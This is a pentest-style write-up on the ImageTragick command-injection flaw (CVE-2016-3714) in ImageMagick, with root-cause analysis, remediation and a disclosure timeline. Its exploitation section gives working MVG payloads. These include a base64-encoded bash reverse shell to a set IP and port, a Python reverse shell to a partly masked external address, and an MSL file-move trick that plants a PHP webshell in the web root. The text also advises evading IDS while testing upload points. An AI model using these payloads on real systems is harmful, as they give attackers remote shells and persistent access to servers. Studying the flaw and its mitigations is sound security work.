---
title: "【CVE-2016–3714】ImageMagick Command Execution Vulnerability"
slug: iuy41o
translationKey: iuy41o
date: 2021-05-30T19:49:44+08:00
source: yuque/penetration
---

# 0x00 Background
ImageMagick is a package commonly used by web services to process images. Multiple vulnerabilities exist when processing user-submitted images: CVE-2016-3714, CVE-2016-3715, CVE-2016-3716, and CVE-2016-3717. The most severe of these is CVE-2016-3714, which can lead to remote code execution (RCE).

> This vulnerability was discovered by Nikolay Ermishkin, a security researcher on the Mail.Ru security team. The ImageMagick development team was notified and pushed out a quick fix, but it turned out to be incomplete.
>
> Security researcher Ryan Huber stepped in, providing more details about the scope of the vulnerability and offering mitigations until the ImageMagick team delivered the final patch (planned for the weekend).
>

Moreover, ImageMagick is a very widely used component. Many vendors invoke this program when processing images, and plenty of open-source applications also include ImageMagick options in their core code.

**Affected versions**

> All versions below 6.9.3-9 are affected.
>
> All versions below 6.9.3-9 are affected
>

---

# 0x01 Exploitation
## (1) PoC
```basic
push graphic-context
viewbox 0 0 200 200
fill 'url(https://example.org/BZVaKhSnwpE/";sleep "6)'
pop graphic-context
```

Of course, in scenarios with a response echo, you can do whatever you want.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623207442804-2aa02652-5ccf-411c-9cbb-67b97b8e7575.png)

## (2) EXP
Notes:

+ Since the server will request the https address, to avoid delays it is best to fill in a URL that can be reached immediately, such as `[https://127.0.0.0/oops.jpg](https://127.0.0.0/oops.jpg)`
+ In addition, after a reverse shell is spawned, the server will hang (block). Therefore it is recommended to add `nohup` and `&` around the reverse shell code, in the following format.

```basic
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg?`echo bm9odXAgL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMC4xLzEzMzcgMD4mMSAm
 | base64 -d | bash`"||id " )'
pop graphic-context
```

In actual testing, the response came back after 10 seconds.

You can also use Python to get a reverse shell, e.g.

```basic
fill 'url(https://example.com/image.jpg"|/bin/echo -e \'import 
socket\x2csubprocess\x2cos;s=socket.socket(socket.af_inet\x2csocket.sock_stream);
s.connect(("xx.xx.24.85"\x2c443));p=subprocess.call(\x5b"/bin/sh"\x2c"-i"\x5d);\'
> /dev/shm/a.py|python "/dev/shm/a.py)'
```

Let me also briefly summarize the other vulnerabilities; the original site is at [https://imagetragick.com/](https://imagetragick.com/)

```basic
CVE-2016-3717 - Local file reading: the contents of files on the server can be retrieved using ImageMagick's "label:@" pseudo-protocol.
CVE-2016-3715 - File deletion: files can be deleted using ImageMagick's "ephemeral" pseudo-protocol, which deletes files after reading them.
CVE-2016-3718 - SSRF: HTTP GET or FTP requests can be issued.
CVE-2016-3716 - File moving: by using ImageMagick's 'msl' pseudo-protocol, an image file can be moved to any file with any extension in any folder.
```

## (3) Writing a webshell
Obviously, combined with `CVE-2016-3716` this can be used to write a `webshell`, for example in [this way](https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html) described by phith0fum:

```basic
Specifically, the msl protocol reads an msl-format XML file and performs some operations based on its contents:

file_move.mvg
-=-=-=-=-=-=-=-=-
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'msl:/tmp/msl.txt'
popgraphic-context

/tmp/msl.txt
-=-=-=-=-=-=-=-=-
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="/tmp/image.gif" />
<write filename="/var/www/shell.php" />
</image>
```

## (4) PHP extension
The PHP extension '`ImageMagick`' (Imagick) is also affected by this issue, and merely calling the constructor of the Imagick class is enough to trigger the vulnerability:

```basic
<?php
new Imagick('vul.gif');
```

There is no return value in this case, so OOB techniques are used to get a response echo.





---

# 0x02 Vulnerability Analysis
According to[ this aritcle](https://www.anquanke.com/post/id/83872)...

 The default configuration file is in `config/delegates.xml.in` in the source code, and few users ever modify it. Its specific content is as follows:

[https://github.com/ImageMagick/ImageMagick/blob/25d021ff1a60a67680dbb640ccc0b6b60f785192/magick/delegate.c#L98](https://github.com/ImageMagick/ImageMagick/blob/25d021ff1a60a67680dbb640ccc0b6b60f785192/magick/delegate.c#L98)

```basic
"  <delegate decode=\"https\" command=\"&quot;wget&quot; -q -O &quot;%o&quot; &quot;https:%M&quot;\"/>"

```

 command defines the actual command that gets passed into system() for execution

```basic
"wget" -q -O "%o" "https:%M"
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1622375873247-c7de629f-263a-4951-b263-a2cac21750ab.png)

But since this is just simple string concatenation, the quotes can be closed to inject commands. For example, if the URL passed in is `https://example.com"|ls "-la`

then

```basic
"wget" -q -O "%o" "https://example.com"|ls "-la"
	the following are executed separately
	"wget" -q -O "%o" "https://example.com"
	and
	ls "-la"
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1622376126138-a1ca77af-f59c-42e7-b2f7-6f9429e92ea2.png)



---

# 0x03 Remediation
This vulnerability affects all ImageMagick versions before 6.9.3-9, including ImageMagick installed from the Ubuntu repositories. The official fix in version 6.9.3-9 was incomplete, so we cannot eliminate this vulnerability simply by updating the ImageMagick version.

1. Before processing an image, first check the image's `magic bytes`, i.e. the image header. If the header is not the format you expect, do not invoke ImageMagick to process the image.
    1. If you are a PHP user, you can use the getimagesize function to check the image format
    2. If you use web applications such as WordPress, you can temporarily uninstall ImageMagick and use PHP's built-in GD library to process images.
2. If upgrading is not possible, the following configuration is recommended, See: [https://legacy.imagemagick.org/discourse-server/viewtopic.php?f=4&t=29588](https://legacy.imagemagick.org/discourse-server/viewtopic.php?f=4&t=29588), i.e. add

```basic

<policy domain="coder" rights="none" pattern="EPHEMERAL" />
<policy domain="coder" rights="none" pattern="HTTPS" />
<policy domain="coder" rights="none" pattern ="MVG" />
<policy domain ="coder" rights ="none" pattern ="MSL" />
<policy domain ="coder" rights ="none" pattern ="TEXT" />
<policy domain="coder" rights="none" pattern="SHOW" />
<policy domain="coder" rights="none" pattern="WIN" />
<policy domain="coder" rights="none" pattern="PLT" />
```

to your `policy.xml` file.

3. Better yet, consider using libraries such as `libpng`, `libjpeg-turbo`, or `giflib` directly.
4. If you must use ImageMagick on untrusted input, consider sandboxing the code with a `seccomp-bpf` sandbox or an equivalent mechanism (such as a Docker container), which strictly limits access to all userspace artifacts and the kernel attack surface. Basic sandboxing techniques such as chroot() or UID separation may not be sufficient.



# 0x04 Summary && Reflections
## (1) When should I test for this vulnerability?
At every image upload point!

BurpSuite's [upload-scanner](https://github.com/PortSwigger/upload-scanner) has integrated detection for this vulnerability, but watch out for IDS.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623206363069-7ecc9146-ad11-4424-b265-3f8678a3ba17.png)



## (2) How was this vulnerability discovered?
Timeline (refer to [https://www.openwall.com/lists/oss-security/2016/05/03/18](https://www.openwall.com/lists/oss-security/2016/05/03/18))

```basic
[2016-04-21] Arbitrary file read vulnerability
[2016-04-28] Nikolay Ermishkin of the Mail.Ru security team discovered
several vulnerabilities in ImageMagick.
[2016-04-30] ImageMagick developers fixed the RCE in the source code and released a new version (6.9.3-9 released http://legacy.imagemagick.org/script/changelog.php ), but this
fix appears to be incomplete. 
[2016-05-03] The imagetragick.com website was created and the vulnerability went public
```

[  
  
  
  
  
  
  
](https://hackerone.com/reports/143966)

## (3) Could ImageMagick still have vulnerabilities?
**Yes!**

This conclusion comes from the page below

[Technical Analysis of ImageTragick (CVE-2016-3714)](https://www.bencode.net/posts/2019-09-27-imagetragick/#root-cause-analysis)

> See: [https://www.bencode.net/posts/2019-09-27-imagetragick/#root-cause-analysis](https://www.bencode.net/posts/2019-09-27-imagetragick/#root-cause-analysis)
>
> For all of ImageMagick's merits, its design does not account for malicious input, and it has a long and colorful history of little-known but equally severe security vulnerabilities. If you want just one data point, look at the work @cunningham did around 2014. @cunningham fuzzed ImageMagick with afl-fuzz and quickly found nearly a dozen exploitable security vulnerabilities.
>
> @hanno's more recent fuzzing work found another family of heap-related bugs, using only off-the-shelf fuzzing tools.
>
> 
>
> It seems that unless the entire ImageMagick codebase undergoes a major redesign, the trickle of security vulnerabilities will not stop anytime soon. It was simply not designed with security in mind.
>

In addition, as early as December 24, 2014, Bastien had already fuzzed out a whole pile of bugs; see: [https://www.openwall.com/lists/oss-security/2014/12/24/1](https://www.openwall.com/lists/oss-security/2014/12/24/1). Seen this way, it is really necessary for web folks to learn some FUZZ techniques!

# Refs
+ [https://legacy.imagemagick.org/discourse-server/viewtopic.php?f=4&t=29588](https://legacy.imagemagick.org/discourse-server/viewtopic.php?f=4&t=29588)
+ [https://www.anquanke.com/post/id/83872](https://www.anquanke.com/post/id/83872)
+ [https://imagetragick.com/](https://imagetragick.com/)
+ [https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html](https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html)
+ [https://github.com/ImageMagick/ImageMagick/blob/25d021ff1a60a67680dbb640ccc0b6b60f785192/magick/delegate.c#L98](https://github.com/ImageMagick/ImageMagick/blob/25d021ff1a60a67680dbb640ccc0b6b60f785192/magick/delegate.c#L98)
+ [https://www.bencode.net/posts/2019-09-27-imagetragick/](https://www.bencode.net/posts/2019-09-27-imagetragick/)
+ [https://hackerone.com/reports/143966](https://hackerone.com/reports/143966)
+ [https://www.openwall.com/lists/oss-security/2016/05/03/18](https://www.openwall.com/lists/oss-security/2016/05/03/18)
+ [https://github.com/ImageTragick/PoCs](https://github.com/ImageTragick/PoCs)
+ about fuzz
    - [https://www.openwall.com/lists/oss-security/2014/12/24/1](https://www.openwall.com/lists/oss-security/2014/12/24/1)
    - [https://blog.fuzzing-project.org/45-ImageMagick-heap-overflow-and-out-of-bounds-read.html](https://blog.fuzzing-project.org/45-ImageMagick-heap-overflow-and-out-of-bounds-read.html)
